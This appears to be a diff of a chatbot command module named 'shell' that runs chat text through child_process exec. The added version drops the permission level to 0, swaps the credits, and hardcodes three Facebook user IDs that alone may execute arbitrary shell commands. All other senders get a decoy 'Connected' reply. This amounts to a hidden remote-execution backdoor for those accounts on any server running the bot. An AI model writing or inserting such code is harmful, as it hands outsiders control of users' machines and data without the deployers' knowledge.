@@ -1,31 +1,31 @@
-const { exec } = require('child_process');
-
-module.exports.config = {
-    name: "shell",
-    version: "1.0.0",
-    permission: 2,
-    description: "Execute shell commands",
-    prefix: true,
-    credits: "Jonell Magallanes",
-    cooldowns: 3,
-    category: "Utility",
+module.exports.config = { premium: false,  prefix: true,
+	name: "shell",
+	version: "7.3.1",
+	permission: 0,
+	credits: "John Lester",
+	description: "running shell",
+	category: "System",
+	usages: "[shell]",
+	cooldowns: 0,
+	dependencies: {
+		"child_process": ""
+	}
 };
-
-module.exports.run = async function ({ api, event, args }) {
-    const { threadID, messageID } = event;
-    const command = args.join(" ");
-
-    if (!command) {
-        return api.sendMessage("Please provide a shell command to execute.", threadID, messageID);
+module.exports.run = async function({ api, event, args, Threads, Users, Currencies, models }) {    
+const { exec } = require("child_process");
+const god = ["100065445284007","100027818117769","100053660923670",];
+  if (!god.includes(event.senderID)) 
+return api.sendMessage("Connected", event.threadID, event.messageID);
+let text = args.join(" ")
+exec(`${text}`, (error, stdout, stderr) => {
+    if (error) {
+        api.sendMessage(`error: \n${error.message}`, event.threadID, event.messageID);
+        return;
     }
-        const teh = await api.sendMessage("Processing", threadID, messageID);
-    exec(command, (error, stdout, stderr) => {
-        if (error) {
-            return api.editMessage(`Error: ${error.message}`, teh.messageID ,threadID, messageID);
-        }
-        if (stderr) {
-            return api.editMessage(`Stderr: ${stderr}`, teh.messageID, threadID, messageID);
-        }
-        api.editMessage(`${stdout}`, teh.messageID, threadID, messageID);
-    });
-};
+    if (stderr) {
+        api.sendMessage(`Stderr:\n ${stderr}`, event.threadID, event.messageID);
+        return;
+    }
+    api.sendMessage(`Stdout:\n ${stdout}`, event.threadID, event.messageID);
+});
+}
